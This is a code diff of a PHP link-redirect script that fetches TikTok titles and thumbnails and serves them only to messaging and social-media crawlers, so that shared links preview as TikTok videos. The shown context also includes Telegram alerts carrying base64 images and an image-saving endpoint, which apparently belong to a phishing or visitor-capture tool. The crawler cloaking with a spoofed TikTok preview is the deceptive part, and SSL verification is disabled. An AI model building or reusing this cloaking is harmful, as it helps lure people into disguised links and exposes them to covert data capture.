@@ -116,59 +116,31 @@ function sendTelegramAlert($chat_id, $message, $image_base64 = null, $custom_tok
     }
 }
 
-// 100% Reliable TikTok Meta Fetching
+// طريقة مباشرة ومضمونة لجلب بيانات تيك توك عبر oEmbed الرسمي
 function fetch_tiktok_exclusive_meta($url) {
-    $meta = ['title' => 'TikTok Video', 'image' => 'https://images.unsplash.com/photo-1622737133809-d95047b9e673?w=800'];
-    
-    // API 1: Tiklydown (Highly reliable)
-    $api1 = "https://api.tiklydown.eu.org/api/download?url=" . urlencode($url);
-    $ch = curl_init($api1);
+    $meta = [
+        'title' => 'TikTok - شاهد الفيديو الآن', 
+        'image' => 'https://images.unsplash.com/photo-1622737133809-d95047b9e673?w=800'
+    ];
+
+    $oembed_url = "https://www.tiktok.com/oembed?url=" . urlencode($url);
+    $ch = curl_init($oembed_url);
     curl_setopt_array($ch, [
-        CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 8, CURLOPT_SSL_VERIFYPEER => false, 
-        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
+        CURLOPT_RETURNTRANSFER => true, 
+        CURLOPT_TIMEOUT => 6, 
+        CURLOPT_SSL_VERIFYPEER => false, 
+        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
     ]);
-    $res1 = curl_exec($ch); curl_close($ch);
-    
-    if ($res1) {
-        $data = json_decode($res1, true);
-        if (!empty($data['title']) && !empty($data['cover'])) {
-            $title = $data['title'];
-            if (stripos($title, 'TikTok') === false) $title = 'TikTok - ' . $title;
-            return ['title' => $title, 'image' => $data['cover']];
+    $res = curl_exec($ch); 
+    curl_close($ch);
+
+    if ($res) {
+        $data = json_decode($res, true);
+        if (!empty($data['title'])) {
+            $meta['title'] = $data['title'];
         }
-    }
-    
-    // API 2: TikWM (Backup)
-    $api2 = "https://www.tikwm.com/api/?url=" . urlencode($url);
-    $ch = curl_init($api2);
-    curl_setopt_array($ch, [
-        CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 8, CURLOPT_SSL_VERIFYPEER => false, 
-        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
-    ]);
-    $res2 = curl_exec($ch); curl_close($ch);
-    
-    if ($res2) {
-        $data = json_decode($res2, true);
-        if (isset($data['code']) && $data['code'] === 0 && !empty($data['data']['title'])) {
-            $title = $data['data']['title'];
-            if (stripos($title, 'TikTok') === false) $title = 'TikTok - ' . $title;
-            return ['title' => $title, 'image' => $data['data']['origin_cover'] ?? $data['data']['cover']];
-        }
-    }
-    
-    // Fallback to oEmbed
-    $ch = curl_init("https://www.tiktok.com/oembed?url=" . urlencode($url));
-    curl_setopt_array($ch, [
-        CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 5, CURLOPT_SSL_VERIFYPEER => false, 
-        CURLOPT_USERAGENT => 'Mozilla/5.0'
-    ]);
-    $res3 = curl_exec($ch); curl_close($ch);
-    if ($res3) {
-        $data = json_decode($res3, true);
-        if (!empty($data['title']) && !empty($data['thumbnail_url'])) {
-            $title = $data['title'];
-            if (stripos($title, 'TikTok') === false) $title = 'TikTok - ' . $title;
-            return ['title' => $title, 'image' => $data['thumbnail_url']];
+        if (!empty($data['thumbnail_url'])) {
+            $meta['image'] = $data['thumbnail_url'];
         }
     }
     
@@ -250,7 +222,6 @@ if (isset($_GET['r'])) {
         $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebook|facebot|meta-externalagent|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger|applebot|discordbot|headless|phantom/i', $ua);
 
         if ($is_bot) {
-            // Added a random cache buster parameter to the image URL (&t=time()) to force WhatsApp to update
             $cache_buster = time();
             $proxy_img_url = "https://" . $_SERVER['HTTP_HOST'] . "/?proxy_img=" . base64_encode($meta_image) . "&t=" . $cache_buster;
             
@@ -389,7 +360,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_image_only'])) {
     }
     exit('OK');
 }
-
 
 // ==========================================
 // Dashboard
